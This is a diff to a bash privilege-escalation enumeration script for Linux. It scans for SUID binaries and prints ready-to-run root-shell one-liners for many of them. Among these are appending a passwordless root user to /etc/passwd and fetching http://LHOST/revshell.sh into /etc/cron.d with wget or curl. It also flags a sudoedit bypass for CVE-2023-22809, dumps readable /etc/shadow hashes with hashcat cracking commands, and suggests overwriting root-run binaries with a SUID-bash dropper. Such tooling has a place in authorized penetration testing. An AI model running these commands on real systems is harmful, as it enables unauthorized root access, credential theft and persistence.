@@ -63,17 +63,103 @@ done
 
 # 3. Custom SUID not in package manager
 sec "CUSTOM SUID BINARIES"
+
+# Known system SUID binaries — not exploitable, skip these
+SYSTEM_SUIDS="su sudo fusermount fusermount3 mount umount newgrp passwd chfn chsh
+gpasswd pkexec pt_chown ssh-keysign at crontab ping ping6 traceroute6
+write wall unix_chkpwd pam_timestamp_check Xorg exim4 postdrop postqueue
+sendmail newuidmap newgidmap dbus-daemon-launch-helper polkit-agent-helper-1"
+
+# Verified GTFOBins SUID entries (has actual SUID section on gtfobins.github.io)
+GTFO_SUID="aa-exec ab apt apt-get aria2c arj awk base32 base64 bash bc bpftrace
+busybox bzip2 c89 c99 capsh cat chmod chown chroot cmp cp cpio cpulimit
+csh curl cut dash date dd diff dig docker ed emacs env expect file find
+fish flock fmt fold gawk gdb gem git grep gzip hd head hexdump iconv ip
+jjs join ksh ld.so less look lua make mawk more msgattrib msgcat msgconv
+msgfilter msgmerge msguniq mv mysql nasm nawk nc netcat nice nl nmap node
+nohup od openssl perl pg php pip pip3 python python3 readelf rev rsync
+ruby run-parts scp sed setarch sftp shuf sort sqlite3 ssh stdbuf strace
+strings tac tail tar taskset tclsh tee tftp timeout troff ul unexpand
+uniq unzip uudecode uuencode vim watch wget xargs xxd xz yash zip zsh"
+
 find / -perm -4000 -type f 2>/dev/null | while read f; do
+    bname=$(basename "$f")
+
+    # skip known non-exploitable system SUID binaries
+    echo "$SYSTEM_SUIDS" | grep -qw "$bname" && continue
+
+    # skip if in package manager (standard system binary)
     if command -v dpkg >/dev/null 2>&1; then
         dpkg -S "$f" >/dev/null 2>&1 && continue
+    elif command -v rpm >/dev/null 2>&1; then
+        rpm -qf "$f" >/dev/null 2>&1 && continue
     fi
-    bname=$(basename "$f")
+
     hot "Custom SUID: $f"
-    gtfo "$bname"
-    exploit "Check GTFOBins link above for SUID exploitation"
-    exploit "Common: $f -p  OR  $f --exec /bin/bash  OR strings $f for clues"
-    [ -w "$f" ] && hot "WRITABLE SUID - instant root!" && \
+    ls -la "$f" 2>/dev/null | while read line; do info "$line"; done
+
+    # only show GTFOBins if binary actually has a SUID entry
+    if echo "$GTFO_SUID" | grep -qw "$bname"; then
+        gtfo "$bname/#suid"
+        # specific exploit hints per binary
+        case "$bname" in
+            bash|sh|dash|zsh|fish|ksh|csh)
+                exploit "$f -p" ;;
+            python*|python)
+                exploit "$f -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'" ;;
+            perl)
+                exploit "$f -e 'exec \"/bin/sh\"'" ;;
+            ruby)
+                exploit "$f -e 'exec \"/bin/sh -p\"'" ;;
+            find)
+                exploit "$f . -exec /bin/sh -p \\; -quit" ;;
+            vim|vi|rvim|rview)
+                exploit "$f -c ':!/bin/sh -p'" ;;
+            nmap)
+                exploit "echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse && $f --script /tmp/x.nse" ;;
+            less|more)
+                exploit "$f /etc/passwd  then type: !/bin/sh" ;;
+            nano)
+                exploit "$f /etc/passwd  then Ctrl+R Ctrl+X  then: reset; sh 1>&0 2>&0" ;;
+            awk|gawk|mawk|nawk)
+                exploit "$f 'BEGIN {system(\"/bin/sh -p\")}'" ;;
+            env)
+                exploit "$f /bin/sh -p" ;;
+            dd)
+                exploit "echo '#!/bin/sh\n/bin/sh' > /tmp/x && $f if=/tmp/x of=/bin/sh" ;;
+            cp)
+                exploit "cp /bin/bash /tmp/ && chmod +s /tmp/bash && /tmp/bash -p" ;;
+            chmod)
+                exploit "$f +s /bin/bash && /bin/bash -p" ;;
+            chown)
+                exploit "$f \$(id -un):\$(id -gn) /etc/shadow" ;;
+            tee)
+                exploit "echo 'root2::0:0::/root:/bin/bash' | $f -a /etc/passwd && su root2" ;;
+            wget)
+                exploit "$f -O /etc/cron.d/x http://LHOST/revshell.sh" ;;
+            curl)
+                exploit "$f http://LHOST/revshell.sh -o /etc/cron.d/x" ;;
+            tar)
+                exploit "$f -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" ;;
+            node)
+                exploit "$f -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'" ;;
+            php*)
+                exploit "$f -r 'pcntl_exec(\"/bin/sh\",[\"-p\"]);'" ;;
+            *)
+                exploit "Check GTFOBins SUID section at link above" ;;
+        esac
+    else
+        # not in GTFOBins - still show but no false link
+        warn "Not in GTFOBins SUID list - may still be exploitable"
+        exploit "Run: strings $f | grep -iE 'exec|system|sh|bash'"
+        exploit "Check if binary calls other programs - PATH hijack may work"
+    fi
+
+    # writable check
+    if [ -w "$f" ]; then
+        hot "AND WRITABLE - instant root!"
         exploit "cp /bin/bash $f && $f -p"
+    fi
 done
 
 # 4. Dangerous capabilities
@@ -144,22 +230,14 @@ for f in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/ssh/sshd_config;
     esac
 done
 
-# 7. Sudo permissions check
-sec "SUDO PERMISSIONS"
+# 7. Sudo version CVE check (no password needed)
+sec "SUDO CVE CHECK"
 sudo_ver=$(sudo -V 2>/dev/null | grep "Sudo version" | awk '{print $3}')
 [ -n "$sudo_ver" ] && info "Sudo version: $sudo_ver"
 echo "$sudo_ver" | grep -qE "^1\.[0-8]\.|^1\.9\.(0|1|2|3|4|5|6|7|8|9|10|11|12p1)" && \
-    hot "Sudo $sudo_ver vulnerable to CVE-2023-22809!" && \
+    hot "Sudo $sudo_ver vulnerable to CVE-2023-22809 (sudoedit bypass)!" && \
     exploit "SUDO_EDITOR='vim -- /etc/sudoers' sudoedit /etc/hosts"
-
-# Check sudo -l entries
-sudo -l 2>/dev/null | grep -v "^$\|Matching\|may run\|env_reset\|mail_badpass\|secure_path" | \
-while read line; do
-    hit "Sudo entry: $line"
-    bin=$(echo "$line" | awk '{print $NF}' | sed 's|.*/||')
-    gtfo "$bin"
-    exploit "Check GTFOBins sudo section for: $bin"
-done
+info "Check sudo perms manually if you have password: sudo -l"
 
 # 8. Shell history cred grep
 sec "SHELL HISTORY CREDENTIALS"
@@ -172,14 +250,32 @@ done
 
 # 9. Shadow backups
 sec "SHADOW / PASSWD BACKUPS"
-[ -r /etc/shadow ] 2>/dev/null && \
-    hot "READABLE /etc/shadow!" && \
-    exploit "Copy hashes and crack: hashcat -m 1800 hashes.txt rockyou.txt" && \
-    cat /etc/shadow 2>/dev/null | grep -v "^[^:]*:[!*]" | head -10
-for f in /etc/shadow- /etc/shadow.bak /etc/passwd- /var/shadow; do
-    [ -r "$f" ] 2>/dev/null && hot "Readable backup: $f" && \
-        exploit "hashcat -m 1800 $f /usr/share/wordlists/rockyou.txt"
+# /etc/shadow - contains password hashes
+if [ -r /etc/shadow ] 2>/dev/null; then
+    hot "READABLE /etc/shadow!"
+    hashes=$(cat /etc/shadow 2>/dev/null | grep -v "^[^:]*:[!*]" | grep -v "^[^:]*::") 
+    if [ -n "$hashes" ]; then
+        echo "$hashes" | head -10 | while read l; do info "$l"; done
+        exploit "Save hashes and crack on Kali:"
+        exploit "hashcat -m 1800 shadow.txt rockyou.txt  (sha512crypt \$6\$)"
+        exploit "hashcat -m 500  shadow.txt rockyou.txt  (md5crypt \$1\$)"
+        exploit "hashcat -m 3200 shadow.txt rockyou.txt  (bcrypt \$2y\$)"
+    fi
+fi
+
+# shadow backup - contains hashes like /etc/shadow
+for f in /etc/shadow- /etc/shadow.bak /var/shadow; do
+    if [ -r "$f" ] 2>/dev/null && [ -s "$f" ]; then
+        hot "Readable shadow backup: $f"
+        exploit "Copy to Kali and crack: hashcat -m 1800 $f rockyou.txt"
+    fi
 done
+
+# /etc/passwd- is a backup of /etc/passwd (NO hashes - just user info)
+if [ -r /etc/passwd- ] 2>/dev/null; then
+    hit "Readable /etc/passwd- backup (user list, no hashes)"
+    diff /etc/passwd /etc/passwd- 2>/dev/null | head -5 | while read l; do info "$l"; done
+fi
 
 # 10. Writable cron binaries
 sec "CRON WRITABLE BINARIES"
@@ -228,7 +324,9 @@ if [ $FULL -eq 1 ]; then
 
 # 13. Process monitoring
 sec "PROCESS MONITORING - 60 seconds"
-warn "Watching for new root processes (pspy replacement)..."
+warn "Watching for new root processes..."
+warn "When you see a root process - check if its binary/script is writable"
+warn "If writable: replace with reverse shell, wait for re-execution = root"
 declare -A seen
 while IFS= read -r line; do seen["$line"]=1; done < \
     <(ps -eo pid,user,cmd --no-headers 2>/dev/null)
@@ -239,12 +337,21 @@ while [ $SECONDS -lt $end ]; do
         user=$(echo "$line" | awk '{print $2}')
         cmd=$(echo "$line" | cut -d' ' -f3-)
         pid=$(echo "$line" | awk '{print $1}')
+        binary=$(echo "$cmd" | awk '{print $1}')
         if [ "$user" = "root" ] || [ "$user" = "0" ]; then
             hot "ROOT PROCESS [PID:$pid]: $cmd"
-            exploit "Check if binary is writable: ls -la $cmd"
-            exploit "Check if script is writable and replace with reverse shell"
-        else
-            hit "New process [$user:$pid]: $cmd"
+            # check if binary is writable
+            if [ -f "$binary" ] && [ -w "$binary" ]; then
+                hot "BINARY IS WRITABLE: $binary"
+                exploit "echo '#!/bin/bash' > $binary"
+                exploit "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> $binary"
+                exploit "chmod +x $binary && wait for re-execution"
+                exploit "Then: /tmp/rootbash -p"
+            else
+                info "Binary not writable - check if it calls other scripts"
+                info "ls -la $binary"
+                info "strings $binary | grep -iE 'sh|exec|system|script'"
+            fi
         fi
         seen["$line"]=1
     done < <(ps -eo pid,user,cmd --no-headers 2>/dev/null)
